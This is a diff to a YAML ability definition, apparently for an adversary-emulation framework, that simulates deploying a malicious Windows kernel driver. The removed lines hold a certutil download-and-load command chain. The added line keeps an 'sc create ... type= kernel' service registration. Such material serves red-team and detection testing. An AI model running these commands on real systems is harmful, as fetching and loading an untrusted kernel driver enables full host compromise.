@@ -1,6 +1,6 @@
 - id: c1143cd9-a709-4323-9678-2117285d1b47
-  name: 80961850786d6531f075b8a6f9a756ad - Malicious Driver Deployment
-  description: 'Malicious driver: 80961850786d6531f075b8a6f9a756ad
+  name: c1143cd9-a709-4323-9678-2117285d1b47 - Malicious Driver Deployment
+  description: 'Malicious driver: c1143cd9-a709-4323-9678-2117285d1b47
 
     Category: vulnerable driver
 
@@ -16,12 +16,8 @@
   platforms:
     windows:
       cmd:
-        command: 'certutil.exe -urlcache -split -f #{{80961850786d6531f075b8a6f9a756ad.bin}}
-          %TEMP%\80961850786d6531f075b8a6f9a756ad.bin && sc create MaliciousDriver
-          binPath= "%TEMP%\80961850786d6531f075b8a6f9a756ad.bin" type= kernel && sc
-          start MaliciousDriver'
-        payloads:
-        - 80961850786d6531f075b8a6f9a756ad.bin
+        command: sc create MaliciousDriver binPath= "C:\Windows\System32\drivers\malicious_driver.sys"
+          type= kernel
   singleton: true
   privilege: Elevated
   repeatable: false
